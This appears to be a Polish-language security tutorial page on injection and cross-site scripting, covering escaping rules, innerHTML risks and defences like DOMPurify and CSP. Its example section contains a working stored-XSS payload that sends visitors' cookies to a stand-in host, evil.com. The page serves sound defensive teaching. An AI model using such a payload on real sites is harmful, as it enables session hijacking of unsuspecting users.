---
title: Injection i XSS
sidebar_position: 17
tags: [xss, injection, attack, owasp-a03]
---

:::info TL;DR
Ataki injection wstrzykują złośliwy kod do zaufanego kontekstu; XSS to wariant po stronie przeglądarki, w którym skrypty kontrolowane przez atakującego wykonują się w przeglądarce ofiary.
:::

## Co to jest?

**Injection** oznacza wstrzykiwanie złośliwego kodu do zaufanego kontekstu — HTML, SQL, JavaScript lub URL — tak aby został zinterpretowany i wykonany zamiast traktowany jako dane. **Cross-Site Scripting (XSS)** to przeglądarkowa forma injection, klasyfikowana jako OWASP A03. Istnieją dwa główne typy:

- **Reflected XSS**: ładunek jest osadzony w URL i odbijany z powrotem w odpowiedzi serwera — wykonuje się w przeglądarce ofiary, gdy odwiedza ona spreparowany link
- **Stored XSS**: ładunek jest zapisywany w bazie danych i wykonuje się dla każdego użytkownika, który wyświetla dotkniętą stronę

## Jak to działa

Główną przyczyną jest mieszanie niezaufanych danych z kodem bez odpowiedniego escapowania. Reguły escapowania różnią się w zależności od kontekstu:

| Kontekst | Reguła |
|---|---|
| HTML | Konwertuj `<`, `>`, `&`, `"`, `'` na encje HTML |
| JavaScript | Escapuj dla stringów/identyfikatorów JS (inne reguły niż HTML) |
| URL | Koduj znaki specjalne przez URL-encoding |

Częstym błędem jest używanie `innerHTML` z niezaufanymi danymi — parsuje to ciąg znaków jako HTML i wykonuje wszelkie osadzone skrypty. Zamiast tego używaj `textContent` lub najpierw escapuj dane.

W przypadkach, gdy HTML musi być renderowany (np. tekst sformatowany), sanityzuj z użyciem biblioteki zamiast próbować samodzielnie budować listę blokowanych wzorców.

## Przykład z rzeczywistości

Pole komentarza na forum zapisuje dane wejściowe użytkownika bezpośrednio do bazy danych bez sanityzacji. Atakujący publikuje:

```html
<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

To jest stored XSS — każdy odwiedzający, który wczyta tę stronę, po cichu wysyła swój plik cookie sesji na serwer atakującego, umożliwiając przejęcie sesji bez żadnej interakcji poza wyświetleniem strony.

## Jak się bronić

- **Escapowanie kontekstowe**: stosuj właściwe reguły escapowania dla każdego kontekstu wyjściowego (HTML, JS, URL)
- **Nigdy nie używaj `innerHTML` z niezaufanymi danymi**: używaj `textContent` lub najpierw escapuj
- **DOMPurify**: biblioteka na poziomie produkcyjnym do sanityzacji HTML — `DOMPurify.sanitize(dirty)`
- **`setHTML()`**: nowoczesne API przeglądarki, które automatycznie sanityzuje przy wstawianiu (Firefox 148+)
- **escape-goat**: lekka biblioteka npm do escapowania HTML — `npm install escape-goat`
- **Content Security Policy (CSP)**: nagłówek HTTP ograniczający, które skrypty przeglądarka będzie wykonywać, zapewniający silną drugą warstwę obrony

**Ćwiczenia i narzędzia:**

- [prompt.ml](https://prompt.ml) — 16 poziomów + 4 ukryte, skupione na omijaniu filtrów
- [escape.alf.nu](https://escape.alf.nu) — 15 zadań, „alert(1) to win!"
- [JSFuck](https://jsfuck.com/) — koduje JS używając tylko znaków `[]()!+`, przydatne do omijania naiwnych filtrów w CTF

:::tip 💡 Łatwe do zapamiętania
Injection jest jak kelner, który głośno odczytuje Twoje pisemne zamówienie i przypadkowo wykonuje wszystko, co napisałeś — escapowanie to proces zapewniający, że kuchnia widzi wyłącznie składniki, nigdy polecenia.
:::
